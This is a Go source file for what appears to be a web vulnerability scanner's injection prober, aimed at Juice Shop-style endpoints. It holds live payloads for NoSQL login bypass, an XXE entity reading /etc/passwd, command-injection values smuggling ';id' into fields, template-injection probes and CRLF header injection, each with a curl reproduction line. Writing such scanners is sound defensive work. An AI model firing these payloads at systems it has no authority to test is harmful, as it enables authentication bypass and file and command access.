package probers

import (
	"context"
	"fmt"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// InjectionProber tests for various injection vulnerabilities beyond SQLi.
type InjectionProber struct{}

func (p *InjectionProber) Name() string { return "injection" }

func (p *InjectionProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	findings = append(findings, p.testNoSQLInjection(cfg)...)
	findings = append(findings, p.testXXE(cfg)...)
	findings = append(findings, p.testCommandInjection(cfg)...)
	findings = append(findings, p.testSSTI(cfg)...)
	findings = append(findings, p.testLogInjection(cfg)...)

	return findings
}

func (p *InjectionProber) testNoSQLInjection(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// NoSQL injection in login
	payloads := []struct {
		body string
		desc string
	}{
		{`{"email":{"$gt":""},"password":{"$gt":""}}`, "MongoDB operator injection in login"},
		{`{"email":{"$ne":""},"password":{"$ne":""}}`, "MongoDB $ne operator bypass"},
	}

	for _, pl := range payloads {
		status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/rest/user/login",
			strings.NewReader(pl.body), map[string]string{"Content-Type": "application/json"})
		if err != nil {
			continue
		}

		if status == 200 && strings.Contains(respBody, "token") {
			findings = append(findings, MakeFinding(
				"NoSQL Injection - Login Bypass",
				"Critical",
				fmt.Sprintf("Login endpoint vulnerable to NoSQL injection: %s", pl.desc),
				"/rest/user/login",
				"POST",
				"CWE-943",
				fmt.Sprintf(`curl -X POST %s/rest/user/login -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, pl.body),
				fmt.Sprintf("HTTP %d - Auth bypass: %s", status, truncate(respBody, 200)),
				"nosql_injection",
				0,
			))
			break
		} else if status == 500 || strings.Contains(strings.ToLower(respBody), "invalid") {
			findings = append(findings, MakeFinding(
				"NoSQL Injection Attempt - Error Response",
				"Medium",
				fmt.Sprintf("Login endpoint processes NoSQL operators producing unexpected errors: %s", pl.desc),
				"/rest/user/login",
				"POST",
				"CWE-943",
				fmt.Sprintf(`curl -X POST %s/rest/user/login -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, pl.body),
				fmt.Sprintf("HTTP %d - Error: %s", status, truncate(respBody, 200)),
				"nosql_injection",
				0,
			))
			break
		}
	}

	return findings
}

func (p *InjectionProber) testXXE(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// XXE via B2B order endpoint
	xxePayload := `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><productId>1</productId><quantity>1&xxe;</quantity><price>0.01</price></order>`

	headers := map[string]string{"Content-Type": "application/xml"}
	if cfg.AuthToken != "" {
		headers["Authorization"] = cfg.AuthToken
	}
	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/b2b/v2/orders",
		strings.NewReader(xxePayload), headers)
	if err == nil {
		lowerBody := strings.ToLower(respBody)
		if (status == 200 && (strings.Contains(lowerBody, "order") || strings.Contains(lowerBody, "coupons_2013"))) || strings.Contains(lowerBody, "root:") {
			sev := "High"
			if strings.Contains(respBody, "root:") {
				sev = "Critical"
			}
			findings = append(findings, MakeFinding(
				"XML External Entity (XXE) Injection - B2B Orders",
				sev,
				"The B2B orders endpoint processes XML input and is vulnerable to XXE injection, potentially allowing file system access.",
				"/b2b/v2/orders",
				"POST",
				"CWE-611",
				fmt.Sprintf(`curl -X POST %s/b2b/v2/orders -H "Content-Type: application/xml" -d '%s'`, cfg.BaseURL, xxePayload),
				fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
				"xxe",
				0,
			))
		}
	}

	// Also try JSON with XML content type
	jsonAsXML := `{"productId":1,"quantity":1}`
	jsonHeaders := map[string]string{"Content-Type": "application/json"}
	if cfg.AuthToken != "" {
		jsonHeaders["Authorization"] = cfg.AuthToken
	}
	s2, _, rb2, e2 := cfg.DoRequest("POST", cfg.BaseURL+"/b2b/v2/orders",
		strings.NewReader(jsonAsXML), jsonHeaders)
	if e2 == nil && s2 == 200 {
		findings = append(findings, MakeFinding(
			"B2B Order API - Content Type Confusion",
			"Medium",
			"The B2B orders endpoint accepts multiple content types, which can be abused for XXE and content type confusion attacks.",
			"/b2b/v2/orders",
			"POST",
			"CWE-436",
			fmt.Sprintf(`curl -X POST %s/b2b/v2/orders -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, jsonAsXML),
			fmt.Sprintf("HTTP %d - Response: %s", s2, truncate(rb2, 200)),
			"misconfig",
			0,
		))
	}

	return findings
}

func (p *InjectionProber) testCommandInjection(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Test command injection in various POST endpoints
	testEndpoints := []struct {
		path   string
		body   string
		method string
	}{
		{"/rest/chatbot/respond", `{"action":"query","query":"test;id"}`, "POST"},
		{"/profile", `{"username":"test;id"}`, "POST"},
		{"/dataerasure", `{"email":"test@test.com;id","securityAnswer":"test"}`, "POST"},
	}

	for _, te := range testEndpoints {
		status, _, respBody, err := cfg.DoRequest(te.method, cfg.BaseURL+te.path,
			strings.NewReader(te.body), map[string]string{"Content-Type": "application/json"})
		if err != nil {
			continue
		}

		lowerBody := strings.ToLower(respBody)
		if strings.Contains(lowerBody, "uid=") || strings.Contains(lowerBody, "root") {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Command Injection - %s", te.path),
				"Critical",
				"The endpoint is vulnerable to OS command injection via user-controlled input.",
				te.path,
				te.method,
				"CWE-78",
				fmt.Sprintf(`curl -X %s %s%s -H "Content-Type: application/json" -d '%s'`, te.method, cfg.BaseURL, te.path, te.body),
				fmt.Sprintf("HTTP %d - Command output: %s", status, truncate(respBody, 200)),
				"command_injection",
				0,
			))
		} else if status != 404 && len(respBody) > 0 {
			// Check if the endpoint accepts the input at all (potential attack surface)
			if status == 200 || status == 201 || status == 500 {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("Potential Injection Vector - %s", te.path),
					"Low",
					fmt.Sprintf("The endpoint %s accepts user input that could potentially be used for injection attacks.", te.path),
					te.path,
					te.method,
					"CWE-74",
					fmt.Sprintf(`curl -X %s %s%s -H "Content-Type: application/json" -d '%s'`, te.method, cfg.BaseURL, te.path, te.body),
					fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
					"command_injection",
					0,
				))
			}
		}
	}

	return findings
}

func (p *InjectionProber) testSSTI(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// SSTI in various input fields
	sstiPayloads := []string{
		`{{7*7}}`,
		`${7*7}`,
		`<%= 7*7 %>`,
	}

	for _, payload := range sstiPayloads {
		// Test in product search
		encoded := strings.ReplaceAll(payload, "{", "%7B")
		encoded = strings.ReplaceAll(encoded, "}", "%7D")
		url := fmt.Sprintf("%s/rest/products/search?q=%s", cfg.BaseURL, encoded)
		status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
		if err != nil {
			continue
		}

		if strings.Contains(respBody, "49") && !strings.Contains(respBody, payload) {
			findings = append(findings, MakeFinding(
				"Server-Side Template Injection (SSTI)",
				"High",
				"The search endpoint evaluates template expressions, indicating SSTI vulnerability.",
				"/rest/products/search",
				"GET",
				"CWE-94",
				fmt.Sprintf(`curl "%s"`, url),
				fmt.Sprintf("HTTP %d - Template evaluated (49 found): %s", status, truncate(respBody, 200)),
				"ssti",
				0,
			))
			break
		}
	}

	return findings
}

func (p *InjectionProber) testLogInjection(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Test log injection via saveLoginIp
	logPayload := `true`
	status, _, respBody, err := cfg.DoRequest("PUT", cfg.BaseURL+"/rest/saveLoginIp",
		strings.NewReader(logPayload), map[string]string{
			"Content-Type":   "application/json",
			"True-Client-IP": "1.2.3.4\nX-Injected: true",
		})
	if err == nil && (status == 200 || status == 201) {
		findings = append(findings, MakeFinding(
			"HTTP Header Injection via True-Client-IP",
			"Medium",
			"The saveLoginIp endpoint trusts the True-Client-IP header and logs it, enabling log injection and CRLF attacks.",
			"/rest/saveLoginIp",
			"PUT",
			"CWE-117",
			fmt.Sprintf(`curl -X PUT %s/rest/saveLoginIp -H "True-Client-IP: 1.2.3.4%%0aInjected: true" -H "Authorization: %s"`, cfg.BaseURL, cfg.AuthToken),
			fmt.Sprintf("HTTP %d - IP saved: %s", status, truncate(respBody, 200)),
			"log_injection",
			0,
		))
	}

	return findings
}
